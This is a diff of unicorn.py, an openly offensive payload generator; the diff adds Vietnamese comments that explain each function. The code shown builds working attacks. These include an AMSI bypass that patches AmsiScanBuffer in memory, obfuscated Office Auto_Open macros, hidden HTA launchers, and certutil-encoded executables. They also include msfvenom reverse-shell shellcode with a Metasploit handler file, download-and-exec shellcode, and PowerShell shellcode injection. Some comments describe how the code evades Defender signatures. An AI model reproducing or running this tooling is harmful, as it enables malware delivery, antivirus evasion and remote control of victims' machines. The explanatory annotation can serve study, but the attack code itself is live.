@@ -11,7 +11,11 @@ import binascii
 from functools import reduce
 
 # python 3 compat
+# try: Mở đầu của một khối try-except. Các câu lệnh bên trong khối này sẽ được thực thi.
+# hàm input() đọc và trả về một chuỗi từ bàn phím.
 try: input = raw_input
+# except NameError: pass`: Nếu `NameError` xảy ra (tức là `raw_input` không tồn tại), câu lệnh `pass` sẽ được thực thi. 
+# pass là một câu lệnh không làm gì cả, được dùng để giữ nguyên cú pháp.
 except NameError: pass
 
 #######################################################################################################
@@ -48,39 +52,51 @@ PRINT_DECODED="OFF"
 #
 # generate a random string
 #
+# def generate_random_string(low, high): Bắt đầu định nghĩa hàm với tên là generate_random_string, nhận hai tham số low và high.
+# length = random.randint(low, high): Sử dụng hàm randint từ thư viện random để tạo một số nguyên ngẫu nhiên trong khoảng từ low đến high (bao gồm cả low và high).
+# letters = string.ascii_letters: Tạo một chuỗi letters chứa tất cả các chữ cái in hoa và thường từ ascii.
 def generate_random_string(low, high):
     length = random.randint(low, high)
     letters = string.ascii_letters  # + string.digits
-    return ''.join([random.choice(letters) for _ in range(length)])
+    return ''.join([random.choice(letters) for _ in range(length)]) #Sử dụng list comprehension để tạo một list gồm length ký tự được chọn ngẫu nhiên từ letters bằng cách sử dụng random.choice. Sau đó, sử dụng join để nối tất cả các ký tự trong list thành một chuỗi và trả về kết quả.
 
 
 # generate a random number based on range
+# vòng lặp chỉ chạy một lần và kết thúc bằng câu lệnh return.
 def generate_random_number(low, high):
     for x in range(1): return random.randint(low,high)
 
 # randomize words for evasion
 def mangle_word(word):
+    # Hàm generate_random_number(1, len(word)) được gọi để tạo một số ngẫu nhiên nằm trong khoảng từ 1 đến độ dài của từ word.
     random_length = generate_random_number(1, len(word))
+    # khởi tạo biến counter được sử dụng để đếm số lượng ký tự đã duyệt qua, assemble sẽ chứa từ đã được xáo trộn.
     counter = 0
     assemble = ""
+    # Hàm sẽ duyệt qua từng ký tự trong từ word.
     for letter in word:
+	# kiểm tra điều kiện sáo trộn Nếu counter bằng với random_length, nó sẽ thêm ký tự hiện tại letter vào chuỗi assemble với định dạng '"+"' + letter + '"+"'. Nếu không, nó chỉ thêm letter vào chuỗi assemble.
         if counter == random_length:
             assemble = assemble + '"+"' + letter + '"+"' 
         else:
             assemble = assemble + letter
+	# cập nhập counter: counter được cập nhật sau mỗi lần duyệt qua ký tự.
         counter = counter + 1 
+    # Trả về từ đã được xáo trộn
     return assemble
 
 # needed for color in unicorn eyes
+# định nghĩa một lớp enum (kiểu liệt kê) trong Python có tên là ColorsEnum. Lớp này chứa một số hằng số được gán cho các màu sắc và hiệu ứng màu sắc khi in ra màn hình console
 class ColorsEnum:
-    CYAN = '\033[96m'
-    BLUE = '\033[94m'
+    CYAN = '\033[96m' # Biểu diễn màu của văn bản trong console
+    BLUE = '\033[94m' 
     RED = '\033[91m'
-    BOLD = '\033[1m'
-    ENDC = '\033[0m'
+    BOLD = '\033[1m'  # Biểu diễn hiệu ứng chữ in đậm trong console.
+    ENDC = '\033[0m'  # Được sử dụng để kết thúc bất kỳ hiệu ứng màu sắc nào, trả về lại màu mặc định của console. 
 
 
 # display unicorn banner
+# định nghĩa hàm có tên gen_unicorn và in ra nôi dung
 def gen_unicorn():
     print(r"""
                                                          ,/
@@ -486,42 +502,53 @@ def gen_usage():
     print("Generate .SettingContent-ms: python unicorn.py ms")
     print("Help Menu: python unicorn.py --help\n")
 
-# Using Rasta Mouse AMSI Bypass: https://raw.githubusercontent.com/rasta-mouse/AmsiScanBufferBypass/master/ASBBypass.ps1
+# định nghĩa hàm có tên bypass và tạo ra một chuỗi PowerShell script được thiết kế để bypass AMSI 
+# AMSI là một giao diện quy tắc trong Windows, giúp ứng dụng antivirus kiểm tra và phòng ngừa mã độc hại
 def bypass_amsi():
+    # Đây là một chuỗi PowerShell script được gán cho biến amsi_string. Bao gồm một đoạn mã C# nhúng trong PowerShell script.
+    # Đoạn mã C# nhúng trong PowerShell script thực hiện các bước sau: Định nghĩa một lớp C# có tên là Win32
+    # Tìm địa chỉ của hàm amsi_scan_buffer trong thư viện amsi.dll và lưu vào biến $2222.
+    # Thay đổi quyền truy cập của trang bị nhớ chứa hàm amsi_scan_buffer để cho phép ghi (0x40). Ghi đè mã máy của hàm amsi_scan_buffer bằng một đoạn mã máy được định nghĩa sẵn để bypass AMSI.
     amsi_string = ("""$1111 = @"\nusing System;using System.Runtime.InteropServices;public class Win32 {[DllImport("$kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport("$kernel32")] public static extern IntPtr LoadLibrary(string name);[DllImport("$kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);}\n"@\nAdd-Type $1111;$2222 = [Win32]::GetProcAddress([Win32]::LoadLibrary("$amsi$dll"), "$amsi$scan$buffer");$3333 = 0;[Win32]::VirtualProtect($2222, [uint32][uint32]5, 0x40, [ref]$3333);$4444 = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);[System.Runtime.InteropServices.Marshal]::Copy($4444, 0, $2222, 6)""")
+    # hàm trả về chuỗi PowerShell script đã được tạo ra
     return amsi_string
 
-# this will convert any url to hexformat for download/exec payload
 def url_hexified(url):
-    x = binascii.hexlify(url)
-    x = x.decode('utf-8')
-    a = [x[i:i+2] for i in range(0, len(x), 2)]
-    list = ""
-    for goat in a: list = list + "\\x" + goat.rstrip()
-    return list
+    x = binascii.hexlify(url) #Hàm này sử dụng thư viện binascii để chuyển đổi địa chỉ URL từ dạng văn bản sang dạng thập lục phân.
+    x = x.decode('utf-8') #Chuỗi thập lục phân thu được từ bước trước đó được giải mã từ bytes sang chuỗi UTF-8. Kết quả là một chuỗi Unicode.
+    a = [x[i:i+2] for i in range(0, len(x), 2)] #Chuỗi Unicode được chia thành các cặp ký tự thập lục phân. Cụ thể, mỗi cặp ký tự sẽ được lưu vào danh sách a.
+    list = "" #Tạo một chuỗi rỗng có tên là list để lưu trữ kết quả cuối cùng.
+    for goat in a: list = list + "\\x" + goat.rstrip() #Lặp qua danh sách a và thêm mỗi cặp ký tự thập lục phân vào chuỗi list, đồng thời thêm ký tự \\x vào trước mỗi cặp.
+    return list #hàm trả về chuỗi list
 
 # split string
 def split_str(s, length):
+    #Đây là một biểu thức list comprehension(cú pháp ngắn gọn để tạo ra danh sách list), nó tạo ra một danh sách mới bằng cách áp dụng biểu thức s[i:i + length] cho mỗi giá trị của i từ 0 đến len(s) với bước là length.
     return [s[i:i + length] for i in range(0, len(s), length)]
 
 # write a file to designated path
 def write_file(path, text):
+    # Mở tệp tin ở đường dẫn path để ghi ("w" là chế độ ghi - write mode). Nếu tệp tin không tồn tại, nó sẽ được tạo mới. Đối tượng tệp tin được lưu trữ trong biến file_write.
     file_write = open(path, "w")
+    # Ghi nội dung văn bản text vào tệp tin. Phương thức write được sử dụng để thêm nội dung mới vào cuối tệp tin hoặc ghi đè nếu tệp tin đã tồn tại.
     file_write.write(text)
+    # Đóng tệp tin sau khi đã ghi nội dung. Việc đóng tệp tin là quan trọng để giải phóng tài nguyên hệ thống và đảm bảo rằng mọi thay đổi đã được lưu lại.
     file_write.close()
 
 
 # scramble commmands into multiple strings
 def scramble_stuff():
-    ps = "powershell.exe"
+    ps = "powershell.exe" #Khởi tạo chuỗi ps với giá trị "powershell.exe".
     list = ""
-    for letter in ps:
-        letter = '"' + letter.rstrip() + '" & '
-        list = list + letter
+    for letter in ps: #Lặp qua từng ký tự trong chuỗi ps,letter là mỗi ký tự trong chuỗi ps.
+        letter = '"' + letter.rstrip() + '" & ' # Mỗi ký tự được bọc trong dấu ", và sau đó thêm chuỗi " & " vào sau mỗi ký tự.
+        list = list + letter #Kết quả được cộng dồn vào biến list.
 
-    full_exe = list[:-2]
+    full_exe = list[:-2] #Loại bỏ hai ký tự cuối cùng (" & ") từ chuỗi list để tạo ra full_exe.
+    #Tách full_exe dựa trên dấu chấm (.) và chỉ giữ phần đầu tiên của nó. Sau đó, loại bỏ bốn ký tự cuối cùng để tạo ps_only.
     ps_only = full_exe.split(".")[0][:-4]
 
+    #Tương tự, tạo các chuỗi full_wscript và full_shell cho WScript và Shell.
     wscript = "WScript"
     shell = "Shell"
     list2 = ""
@@ -538,26 +565,30 @@ def scramble_stuff():
 
     full_shell = list3[:-2]
 
-    return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
+    return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell 
+    #trả về một chuỗi kết hợp giữa full_exe, ps_only, full_wscript, và full_shell, được phân cách bằng dấu phẩy.
 
 # generate full macro
 def generate_macro(full_attack, line_length=50):
 
     # we don't want to have AMSI_BYPASS messing with the payload itself so we strip the AMSI Bypass code to run our full powershell payload
+    # Kiểm tra và Loại bỏ AMSI Bypass Code
     if ("# actual unicorn payload") in full_attack:
         full_attack = full_attack.split("actual unicorn payload")[1].split("\n")[1].rstrip()
 
-    # randomize macro name
+    # tạo một tên macro ngẫu nhiên từ 5 đến 10 ký tự.
     macro_rand = generate_random_string(5, 10)
-    # start of the macro
+    # Đây là phần bắt đầu của một macro trong VBA.
     macro_str = ("Sub Auto_Open()\nDim {0}\n{1} = ".format(macro_rand, macro_rand))
     if line_length is None:
         line_length_int = 50
     else:
         line_length_int = int(line_length)
+    #Phân chia Payload Powershell thành Dòng và Gán vào Biến Macro, split_str để chia payload Powershell thành danh sách các dòng dài line_length_int
     powershell_command_list = split_str(full_attack, line_length_int)
 
     counter = 0
+    # Duyệt qua từng dòng của payload và thêm vào chuỗi macro.
     for line in powershell_command_list:
         if counter == 0:
             macro_str += " \"" + line + "\"\n"
@@ -566,7 +597,7 @@ def generate_macro(full_attack, line_length=50):
 
         counter = counter + 1
 
-    # strip un-needed
+    # Loại bỏ Kí tự không cần thiết
     macro_str = macro_str.replace(r's\"\"v', "sv").replace(r'e\"\"c', 'ec').replace(r'\"\"v', 'v').replace(r'g\"\"v', 'gv')
 
     macro_str = macro_str.replace('powershell /w 1 /C "', r' /w 1 /C ""')
@@ -574,7 +605,7 @@ def generate_macro(full_attack, line_length=50):
     macro_str = macro_str.replace("')", "')\"")
 
     # obfsucate the hell out of Shell and PowerShell
-    long_string = scramble_stuff().split(",")
+    long_string = scramble_stuff().split(",") #Sử dụng hàm scramble_stuff để tạo một danh sách các chuỗi được obfuscate.
     # full powershell.exe
     ps_long = long_string[0]
     # ps abbreviated
@@ -583,11 +614,11 @@ def generate_macro(full_attack, line_length=50):
     wscript = long_string[2]
     # shell
     shell = long_string[3]
-
+    #Thay thế một số phần của macro liên quan đến PowerShell với chuỗi obfuscated
     macro_str = macro_str.replace('powershell /w 1', ps_short + ' & " /w 1')
     macro_str = macro_str.replace(';powershell', ';" & "' + ps_short + ' & "')
 
-    # randomized variables
+    #Tạo các biến ngẫu nhiên và chuỗi thông báo.
     function1 = generate_random_string(5, 15)
     function2 = generate_random_string(5, 15)
     function3 = generate_random_string(5, 15)
@@ -601,10 +632,10 @@ def generate_macro(full_attack, line_length=50):
     # title bar on top what it states there, you can also change this to whatever you want
     subject_message = ("Microsoft Office (Compatibility Mode)")
  
-    # our final product of obfsucated code - note that defender made a signature to look for WScript.Run with a compacted string with a "False" terminal window. Just needed to split it out into two lines :P
+    # Thêm phần cuối cùng của macro, bao gồm một message box và thoát ứng dụng.
     macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim waitOnReturn As Boolean: waitOnReturn = False\nDim windowStyle As Integer: windowStyle = 0\nDim {14}\n{14} = {15} & " "\n{17}.Run {18} & {19}, windowStyle, waitOnReturn\n\nDim title As String\ntitle = "{21}"\nDim msg As String\nDim intResponse As Integer\nmsg = "{20}"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6,macro_rand,macro_message,subject_message))
 
-    # strip and fix issues
+    # Loại bỏ một số kí tự không cần thiết và trả về chuỗi macro đã tạo.
     macro_str = macro_str.replace("''", "")
 
     return macro_str
@@ -612,40 +643,43 @@ def generate_macro(full_attack, line_length=50):
 
 # generate Matthew Graeber's (Matt rocks) attack for binary to cert format #KeepMattHappy
 def gen_cert_attack(filename):
-    if os.path.isfile(filename):
-        # make sure the directory is made
-        if not os.path.isdir("decode_attack"):
+    if os.path.isfile(filename): #Kiểm tra Tồn Tại của Tệp Tin
+        # Tạo Thư Mục Đích để Lưu Trữ Tệp Tin
+        if not os.path.isdir("decode_attack"): 
             os.makedirs("decode_attack")
 
-        # remove old files here
+        # Xóa Các Tệp Tin Cũ
         if os.path.isfile("decode_attack/encoded_attack.crt"):
             os.remove("decode_attack/encoded_attack.crt")
 
         print("[*] Importing in binary file to base64 encode it for certutil prep.")
+	#Đọc Tệp Tin và Mã Hóa Base64
         data = open(filename, "rb").read()
         data = base64.b64encode(data)
         print("[*] Writing out the file to decode_attack/encoded_attack.crt")
+	# Ghi Ra Tệp Tin Đã Mã Hóa và Tạo File Command Decode
         write_file("decode_attack/encoded_attack.crt",
                    "-----BEGIN CERTIFICATE-----\n{0}\n-----END CERTIFICATE-----".format(data))
         print("[*] Filewrite complete, writing out decode string for you..")
+	# Ghi Ra Tệp Tin Đã Mã Hóa và Tạo File Command Decode
         write_file("decode_attack/decode_command.bat",
                    "certutil -decode encoded_attack.crt encoded.exe")
         print("[*] Exported attack under decode_attack/")
         print("[*] There are two files, encoded_attack.crt contains your encoded data")
         print("[*] The second file, decode_command.bat will decode the cert to an executable.")
+    # Xử Lý Trường Hợp Tệp Tin Không Tồn Tại
     else:
         print("[!] File was not found. Exiting the unicorn attack.")
         sys.exit()
 
 # Generate HTA launchers and index
 def gen_hta_attack(command):
-    # HTA code here
+    # Chuẩn Bị Dữ Liệu và Tạo Tên Biến Ngẫu Nhiên
 
     command = command.replace("'", "\\'")
-    # generate random variable names for vba
+    
     hta_rand = generate_random_string(10, 30)
 
-    # split up so we arent calling shell command for cmd.exe
     shell_split1 = generate_random_string(10, 100)
     shell_split2 = generate_random_string(10, 100)
     shell_split3 = generate_random_string(10, 100)
@@ -657,54 +691,57 @@ def gen_hta_attack(command):
     ps_split2 = generate_random_string(10, 100)
     ps_split3 = generate_random_string(10, 100)
     ps_split4 = generate_random_string(10, 100)
-
+	
+    # Tạo Mã HTML và JavaScript
     main1 = ("""<script>\n{0} = "WS";\n{1} = "crip";\n{2} = "t.Sh";\n{3} = "ell";\n{4} = ({0} + {1} + {2} + {3});\n{6} = "pow";\n{7} = "ersh";\n{8} = "ell";\n{9} = ({6} + {7} + {8});\n{5}=new ActiveXObject({4});\n""".format(shell_split1, shell_split2, shell_split3, shell_split4, shell_split5, hta_rand, ps_split1, ps_split2, ps_split3, ps_split4))
     main2 = ("""{0}.run(""".format(hta_rand))
     main4 = ("""{0}', 0);window.close();\n</script>""".format(command)).replace("powershell", "{0} + '".format(ps_split4)).replace(";{0}".format(ps_split4), ";' + {0}".format(ps_split4))
     html_code = ("""<iframe id="frame" src="Launcher.hta" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>""")
 
-    # remote old directory
+    # Xóa Thư Mục Cũ và Tạo Thư Mục Mới
     if os.path.isdir("hta_attack"):
         shutil.rmtree("hta_attack") 
 
     os.makedirs("hta_attack")
 
-    # write out index file
+    # Ghi Ra Tệp Tin HTML và HTA
     print("[*] Writing out index file to hta_attack/index.html")
     write_file("hta_attack/index.html", html_code)
 
-    # write out Launcher.hta
+    # Ghi Ra Tệp Tin HTML và HTA
     print("[*] Writing malicious hta launcher hta_attack/Launcher.hta")
     write_file("hta_attack/Launcher.hta", main1 + main2 + main4)
 
 
 # format metasploit shellcode
 def format_metasploit(data):
-    # start to format this a bit to get it ready
+    # Thay Thế Ký Tự. repls được sử dụng để ánh xạ các ký tự cần được thay thế vào chuỗi shellcode
+    # reduce được sử dụng để lặp qua từ điển và thay thế các ký tự tương ứng trong chuỗi data
+    # rstrip() được gọi để loại bỏ các khoảng trắng cuối chuỗi.
     repls = {';': '', ' ': '', '+': '', '"': '', '\n': '', 'buf=': '', 'Found 0 compatible encoders': '','unsignedcharbuf[]=': ''}
     #data = data.decode()
     data = reduce(lambda a, kv: a.replace(*kv),iter(repls.items()), data).rstrip()
+    #Kiểm Tra Định Dạng Dữ Liệu
     if len(data) < 1:
         print("[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.")
         print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
         print("[!] Also ensure your syntax for unicorn is correct. Missing IP address, port, etc. etc. will cause this error.")
         print("Exiting....")
         sys.exit()
-
+    #Trả về Dữ Liệu Đã Định Dạng
     return data
 
 
 # generate the actual shellcode through msf
 def generate_shellcode(payload, ipaddr, port):
     print("[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...")
+    #Chuẩn bị Dữ Liệu Đầu Vào Hàm này nhận các tham số payload, ipaddr, và port.
     port = port.replace("LPORT=", "")
-
-    # if we are using traditional payloads and not download_exec
     if not "exe=" in ipaddr:
         ipaddr = "LHOST={0}".format(ipaddr)
         port = "LPORT={0}".format(port)
 
-    # if download_exec is being used
+    # Xử lý Download và Thực Thi, url= xuất hiện trong ipaddr, shellcode sẽ được tạo để download và thực thi từ URL đã chỉ định
     if "url=" in ipaddr:
         # shellcode modified from https://www.exploit-db.com/exploits/24318/ - tested on windows xp, windows 7, windows 10, server 2008, server 2012
         shellcode = ("\\x33\\xC9\\x64\\x8B\\x41\\x30\\x8B\\x40\\x0C\\x8B"
@@ -742,64 +779,65 @@ def generate_shellcode(payload, ipaddr, port):
 
     else:
 
-        # gen random number for length
-        #uri_length=generate_random_number(5,7)
+        # Xử lý Payload thông thường,Nếu không có url=, shellcode sẽ được tạo bằng cách gọi msfvenom với các tham số tương ứng
+	# Dữ liệu shellcode được lấy từ stdout của quá trình con và sau đó được chuyển đổi thành định dạng ASCII
         proc = subprocess.Popen("msfvenom -p {0} {1} {2} -t 0 --platform windows -f c".format(payload, ipaddr, port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        # AutoUnhookProcess=true AutoVerifySession=false AutoLoadStdapi=false  AutoSystemInfo=false --smallest
         data = proc.communicate()[0]
-        # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         data = data.decode("ascii").replace('"\\xfc', '"', 1)
-        # bug output for metasploit, going to check here - if present then throw error message to end user
         if "no longer be in use" in data or "long,erbe,inus,e,so,tryd,elet,ingt" in data:
             print("[!] There was a problem generating the shellcode due to a Metasploit error. Please update Metasploit and re-run this.")
             sys.exit()
 
-    # return the metasploit data
+    # Trả về Dữ Liệu Shellcode Đã Định Dạng
     return format_metasploit(data)
 
 # generate shellcode attack and replace hex
 def gen_shellcode_attack(payload, ipaddr, port):
-    # regular payload generation stuff
-    # generate our shellcode first
+    # Kiểm tra xem địa chỉ IP (ipaddr) có khác "cobaltstrike" không. Nếu có, điều này ngụ ý rằng không đang sử dụng Cobalt Strike.
     if ipaddr != ("cobaltstrike"):
+	# Tạo shellcode dựa trên payload, địa chỉ IP, và cổng được chỉ định.
         shellcode = generate_shellcode(payload, ipaddr, port).rstrip()
-        # sub in \x for 0x
+        # Định dạng lại shellcode bằng cách thay thế \\x bằng 0x và chia thành các đoạn có bốn ký tự
         shellcode = re.sub("\\\\x", "0x", shellcode)
-        # base counter
+        # Đếm số ký tự đã được xử lý.
         counter = 0
-        # count every four characters then trigger floater and write out data
+        # Chuỗi tạm thời để tích hợp các ký tự từ shellcode.
         floater = ""
-        # ultimate string
+        # Chuỗi chứa các đoạn shellcode đã được chia thành nhóm 4 ký tự.
         newdata = ""
+	# Lặp qua từng ký tự trong shellcode.
         for line in shellcode:
+	    # Thêm ký tự hiện tại vào floater và tăng biến đếm.
             floater += line
             counter += 1
+	    # Nếu đã thêm đủ 4 ký tự vào floater, thêm floater vào newdata, sau đó làm sạch floater và reset counter về 0.
             if counter == 4:
                 newdata = newdata + floater + ","
                 floater = ""
                 counter = 0
 
-        # here's our shellcode prepped and ready to go
+        # Gán giá trị cuối cùng của newdata cho shellcode sau khi đã loại bỏ dấu "," ở cuối.
         shellcode = newdata[:-1]
 
-        # if we aren't using download/exec
+        # Kiểm tra xem chuỗi "url=" có xuất hiện trong địa chỉ IP không. Nếu không, đồng nghĩa với việc không sử dụng chế độ download/exec.
         if not "url=" in ipaddr:
-            # write out rc file
+            # Nếu không sử dụng chế độ download/exec, ghi ra tệp "unicorn.rc" với nội dung được định dạng để cấu hình Metasploit với thông số payload, địa chỉ IP và cổng đã cho
             write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(payload, ipaddr, port))
 
-    # switch variable to be shellcode for formatting
+    # kiểm tra xem giá trị của ipaddr có phải là "cobaltstrike" không. Nếu điều này đúng, nó gán giá trị của payload cho shellcode.
     if ipaddr == "cobaltstrike": shellcode = payload
 
     # added random vars before and after to change strings
     # this is a hack job but it works in checking to see if there are any variable name conflicts. While random, can happen when using only 2 randomized characters for char lenght. 
-    while True:
-        varcheck = ("")
+    while True: #Một vòng lặp vô hạn (while True)
+        varcheck = ("") #varcheck được thiết lập lại thành một chuỗi rỗng và reroll được đặt thành False
         reroll = False
-        var1 = "$" + generate_random_string(2, 2) # $1
+	#var1 đến var19 được tạo ra với tên ngẫu nhiên và kiểm tra xem chúng có trùng lặp với các biến trước đó hay không.
+        var1 = "$" + generate_random_string(2, 2) # $1 
         varcheck = var1
         var2 = "$" + generate_random_string(2, 2) # $c
         if var2.lower() in varcheck.lower():
-            reroll = True
+            reroll = True #Nếu có trùng lặp reroll được đặt thành True và vòng lặp tiếp tục để tạo lại các biến.
         varcheck = varcheck + var2
         var3 = "$" + generate_random_string(2, 2) # $2 - powershell
         if var3.lower() in varcheck.lower():
@@ -875,32 +913,32 @@ def gen_shellcode_attack(payload, ipaddr, port):
         if var19.lower() in varcheck.lower():
             reroll = True
         varcheck = varcheck + var19
-
+	# Nếu có trùng lặp (reroll == True), thông báo "Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names." được in ra.
         if reroll == True: print("[*] Great Scott!! There was a variable conflict. This happens. It's OK Marty. Rerolling variable names until we get a solid set to remove conflicting names.")
-        if reroll == False: break
+        if reroll == False: break #Nếu không có trùng lặp (reroll == False), vòng lặp sẽ thoát.
 
-    # generate random service name from win32 - defender was looking from name win32 + 0x00 length inside of byte array
+    # Randomization của tên dịch vụ: randomize_service_name là một chuỗi ngẫu nhiên có độ dài 2 được tạo bằng hàm generate_random_string(2,2). Điều này có thể được sử dụng để tạo tên dịch vụ ngẫu nhiên hoặc một biến trong đoạn mã sau
     randomize_service_name = generate_random_string(2,2)
 
-    # randomize kernel32.dll for fun
+    # Randomization của chiều dài của chuỗi ngẫu nhiên: random_length là một số ngẫu nhiên được tạo bằng hàm generate_random_number(1,12). Tuy nhiên, hiện tại đoạn mã này không sử dụng random_length ở đâu cả.
     random_length = generate_random_number(1,12)
 
-    # random var name  
+    # Randomization của tên biến: full_command là một biến được tạo với tên ngẫu nhiên, có thể được sử dụng để chứa một phần của đoạn mã hoặc tên biến khác. 
     full_command = generate_random_string(2,2)
 
-    # randomize kernel32.dll and msvcrt.dll
+    # Randomization của tên thư viện và hàm: kernel, msv, Win32, true_mangle là các biến chứa tên của các thư viện và hàm. Chúng được chuyển qua hàm mangle_word để "làm rối" tên và giúp tránh bị phát hiện bởi các công cụ bảo mật
     kernel = mangle_word("kernel32.dll")
     msv = mangle_word("msvcrt.dll")
     Win32 = mangle_word("Win32Functions")
     true_mangle = mangle_word("True")
-    # here we do a little magic to get around AMSI, no more cat and mouse game here by chunking of shellcode, it's not needed since Defender and AMSI is still signature driven primarily
+    #random_symbols là một mảng chứa các ký tự ngẫu nhiên được sử dụng để "làm rối" shellcode. Một ký tự từ random_symbols được chọn ngẫu nhiên và thay thế cho chuỗi "0x" trong biến shellcode. Điều này có thể giúp tránh phát hiện shellcode thông qua các biểu hiện đặc trưng.
     random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
     random_symbols = ['}']
     mangle_shellcode = (random.choice(random_symbols))
 
     #mangle_shellcode = generate_random_string(1, 1).upper()
     shellcode = shellcode.replace("0x", mangle_shellcode)
-
+    # Randomization của tên biến và chuỗi: Các biến randomized_byte_name, syswow_var, noexit, truevalue, syswowsplit_1, syswowsplit_2 đều được tạo với tên ngẫu nhiên và có thể được sử dụng để chứa các giá trị ngẫu nhiên trong quá trình thực thi.
     # mangle 0x
     randomized_byte_name = generate_random_string(3,4)
 
@@ -916,10 +954,10 @@ def gen_shellcode_attack(payload, ipaddr, port):
     syswowsplit_1 = generate_random_string(3,4)
     syswowsplit_2 = generate_random_string(3,4)
 
-    # one line shellcode injection with native x86 shellcode
+    # powershell_code là một đoạn mã PowerShell được tạo dựa trên các giá trị ngẫu nhiên và shellcode đã được "làm rối". Nó thực hiện một số thao tác như tạo chuỗi Base64, thực hiện một số gán giá trị và thực thi một command PowerShell.
     powershell_code = (r'''$1111='$tttt=''[DllImport(("%s"))]public static extern IntPtr calloc(uint dwSize, uint amount);[DllImport("%s")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("%s")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint %s);[DllImport("%s")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$zzzz="%s";$wwww=Add-Type -pass -m $tttt -Name "%s" -names $Win32;$wwww=$wwww.replace("$Win32", "%s");[byte[]]$zzzz = $zzzz.replace("SHELLCODE_STUB","$randomized_byte_namex").replace("$randomized_byte_name", "0").Split(",");$gggg=0x$randstack;if ($zzzz.L -gt 0x$randstack){$gggg=$zzzz.L};$xxxx=$wwww::calloc(0x$randstack, 1);[UInt64]$tempvar = 0;for($iiii=0;$iiii -le($zzzz.Length-1);$iiii++){$wwww::memset([IntPtr]($xxxx.ToInt32()+$iiii), $zzzz[$iiii], 1)};$wwww::VirtualProtect($xxxx, 0x$randstack, 0x40, [Ref]$tempvar);$yyyy=[int]0x00;$wwww::CreateThread([int]0,$yyyy,$xxxx,0,0,1-1);';$hhhh=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($1111));$2222="powershell";$4444="Windows";$5555 = "C:\$4444\$syswowsplit_1$syswowsplit_2\$4444$2222\v1.0\$2222";$5555 = $5555.replace("$syswowsplit_1", "sys");$5555 = $5555.replace("$syswowsplit_2", "wow64");$$truevalue = '%s';if([environment]::Is64BitOperatingSystem -eq '$$truevalue'){$2222= $5555};$fullcommand=" $2222 $noexit $hhhh";$fullcommand=$fullcommand.replace("$noexit", "-noexit -e");iex $fullcommand''' % (msv,kernel,kernel,tempvar_withoutdollar,msv,shellcode,randomize_service_name,Win32,true_mangle)).replace("SHELLCODE_STUB", mangle_shellcode)
 
-    # run it through a lame var replace
+    # Thay thế biến trong đoạn mã PowerShell: Các biến được thay thế trong đoạn mã PowerShell sử dụng các giá trị đã được tạo và các tên biến ngẫu nhiên.
     powershell_code = powershell_code.replace("$1111", var1).replace("$cccc", var2).replace(
         "$2222", var3).replace("$3333", var4).replace("$xxxx", var5).replace("$tttt", var6).replace(
         "$hhhh", var7).replace("$zzzz", var8).replace("$gggg", var9).replace("$iiii", var10).replace(
@@ -928,44 +966,48 @@ def gen_shellcode_attack(payload, ipaddr, port):
         "$fullcommand", "$" + full_command).replace("$5555", "$" + syswow_var).replace("$noexit", noexit).replace(
         "$truevalue", truevalue).replace("$syswowsplit_1", syswowsplit_1).replace("$syswowsplit_2", syswowsplit_2)
 
-    # if we have PRINT_DECODED="ON" this will spit out the raw powershell code for you
+    # Kiểm tra xem biến PRINT_DECODED có giá trị là "on" hay không. .lower() được sử dụng để đảm bảo rằng giá trị so sánh được thực hiện ở dạng chữ thường.
     if PRINT_DECODED.lower() == "on":
-        if AMSI_BYPASS.lower() == "on":
+        if AMSI_BYPASS.lower() == "on": #tiếp theo kiểm tra xem biến BYPASS PAYLOAD BELOW")`: In ra thông điệp "# AMSI BYPASS PAYLOAD BELOW".
             print("# AMSI BYPASS PAYLOAD BELOW")
-            print(bypass_amsi())
+            print(bypass_amsi()) #Gọi hàm bypass_amsi() và in ra kết quả của hàm này
             print("\n# ACTUAL UNICORN PAYLOAD BELOW")
-        print(powershell_code)
+        print(powershell_code) #n ra mã PowerShell có tên là powershell_code.
+	#In ra một thông điệp chú thích, cảnh báo người đọc rằng việc in ra mã PowerShell đã được bật, và để có được mã đầy đủ của Unicorn, bạn nên tắt chức năng in ra mã PowerShell.
         print("\n[*] Note that PRINT_DECODED inside unicorn.py was specified and printing the raw output for the PowerShell code. Turn this off to get the full unicorn code.")
